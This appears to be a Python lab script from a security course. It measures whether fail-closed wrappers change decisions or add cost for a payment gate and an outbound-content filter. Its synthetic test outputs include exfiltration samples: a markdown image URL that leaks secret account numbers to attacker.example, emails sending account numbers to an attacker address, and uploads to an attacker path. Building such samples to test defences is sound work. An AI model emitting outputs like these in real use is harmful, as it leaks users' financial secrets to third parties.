#!/usr/bin/env python3
"""Chapter 47, lab 2 (no model): does the fail-closed edge change any decision on well-formed input, and what does it cost?
3,000 random well-formed payment requests (some over limits, some duplicates, some day-seasoning cases) run through MoneyGate raw and through hard_money on identical fresh worlds;
2,000 egress outputs (benign and hostile, from the Chapter 12 generator style) through Egress level 4 raw and through hard_egress.  Writes results/ch47_regress.json."""
import sys, json, random, time
from pathlib import Path
here = Path(__file__).resolve().parent; sys.path.insert(0, str(here))
from bulwark.moneypath import *
from bulwark.egress import Ctx, Output, Egress
from bulwark.failclosed import hard_money, hard_egress
rng = random.Random(4701)
def world():
    v = Vendors({f"p{i}": Vendor(f"p{i}", f"V{i}", f"ACC-{i}", 300_000, live_since=rng_state[i][0], created_day=-365, confirmed_by="kb" if rng_state[i][1] else None) for i in range(5)})
    return MoneyGate("t", v, dict(INV), Ledger(), tenant_daily_cap=10**9, payee_daily_count=50, payee_daily_cents=10**9)
rng_state = [(-300, True), (-2, True), (-300, False), (0, True), (-300, True)]
INV = {}; REQS = []
for k in range(3000):
    p = f"p{rng.randrange(5)}"; amt = rng.choice([rng.randrange(1_000, 300_000), rng.randrange(1_000, 1_000_000)]) // 100 * 100
    iid = f"i{k}"; INV[iid] = Invoice(iid, p, amt, confirmed=rng.random() > .03)
    if rng.random() < .08: INV[iid].amount_cents += 100
    if rng.random() < .05: INV[iid].payee_id = f"p{rng.randrange(5)}"
    doc = amt if rng.random() > .1 else rng.choice([amt * 10, DOC_NOT_FOUND, None])
    appr = rng.choice([None, "prin_kevin", "prin_emily"])
    REQS.append(PayRequest(iid, p, amt, doc, rng.randrange(0, 400), "prin_emily", appr))
def run(f):
    g = world(); res = []; t0 = time.perf_counter()
    for r in REQS:
        d = f(g, r); res.append((d.outcome, tuple(d.codes)))
    return res, (time.perf_counter() - t0)
a, ta = run(lambda g, r: g.check(r)); b, tb = run(hard_money)
diff_m = sum(x != y for x, y in zip(a, b)); from collections import Counter; mix = Counter(x[0] for x in a)
SEC = ("US-ACC-44110022", "TX-48213-771")
CTX = Ctx("biz_hcb", ("ledgerly.example", "lonestar-paper.example"), ("files.sharehost.example",), frozenset({"orders@lonestar-paper.example"}), SEC)
OUTS = []
for k in range(2000):
    s = rng.choice(SEC); t = rng.random()
    if t < .4: OUTS.append(Output("email", to="orders@lonestar-paper.example", body=f"Remittance for invoice {k}. Thank you. " * rng.randrange(1, 40)))
    elif t < .55: OUTS.append(Output("request", url=f"https://app.ledgerly.example/r/{k}?x={rng.randrange(99)}"))
    elif t < .7: OUTS.append(Output("render", body=f"Summary {k}\n\n![s](https://attacker.example/p.png?d={s})"))
    elif t < .85: OUTS.append(Output("email", to="x@attacker.example", body=f"Account {s}"))
    else: OUTS.append(Output("request", url=f"https://files.sharehost.example/u/attacker/{k}"))
def runE(f):
    e = Egress(4, CTX); res = []; t0 = time.perf_counter()
    for o in OUTS: ok, why, _ = f(e, o); res.append((ok, why))
    return res, time.perf_counter() - t0
c, tc = runE(lambda e, o: e.check(o)); d, td = runE(hard_egress)
diff_e = sum(x != y for x, y in zip(c, d))
out = dict(money_requests=len(REQS), money_mix=dict(mix), money_decisions_changed=diff_m, money_ms_raw=round(ta * 1000, 1), money_ms_hard=round(tb * 1000, 1),
           egress_outputs=len(OUTS), egress_allowed=sum(x[0] for x in c), egress_decisions_changed=diff_e, egress_ms_raw=round(tc * 1000, 1), egress_ms_hard=round(td * 1000, 1))
print(json.dumps(out, indent=1)); (here / "results" / "ch47_regress.json").write_text(json.dumps(out, indent=1))
